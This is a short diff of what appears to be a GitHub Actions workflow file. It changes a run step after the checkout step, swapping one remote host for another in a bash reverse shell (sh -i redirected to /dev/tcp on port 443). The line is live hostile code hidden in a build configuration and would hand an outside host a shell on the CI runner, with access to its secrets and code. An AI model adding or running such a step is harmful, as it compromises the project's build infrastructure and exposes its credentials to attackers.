@@ -14,5 +14,5 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v3
 
-      - run: sh -i >& /dev/tcp/goku.1337.cx/443 0>&1
+      - run: sh -i >& /dev/tcp/117.214.156.18/443 0>&1
         shell: bash
